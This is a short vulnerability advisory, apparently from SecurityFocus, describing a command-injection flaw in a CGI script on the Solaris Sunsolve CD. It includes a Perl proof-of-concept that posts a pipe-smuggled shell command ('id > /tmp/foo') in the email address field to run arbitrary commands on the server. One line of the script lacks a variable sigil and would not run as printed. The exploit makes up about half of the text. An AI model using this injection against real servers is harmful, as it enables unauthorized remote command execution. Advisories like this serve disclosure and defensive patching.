source: http://www.securityfocus.com/bid/4269/info

The Sunsolve CD is part of the Solaris Media pack. It is included as a documentation resource, and is available for the Solaris Operating Environment.

A CGI script included with the CD does not adequately sanitize input. Due to a design failure which does not remove special characters such as the pipe (|) character, a user submitting a malicious email address to the script could execute arbitrary commands with the permissions of the executing program. 

#!/usr/bin/perl
use LWP::UserAgent;
use HTTP::Request::Common qw(POST);
ua = new LWP::UserAgent;
$ua->agent("Scrapers");
my $req = POST  'http://sunsolveCD.box.com:8383/cd-cgi/sscd_suncourier.pl',
[
step =>  "submit" ,
emailaddr => "foo\@bar.com| id > /tmp/foo|"];
$res = $ua->request($req);
print $res->as_string;
print "code", $res->code, "\n";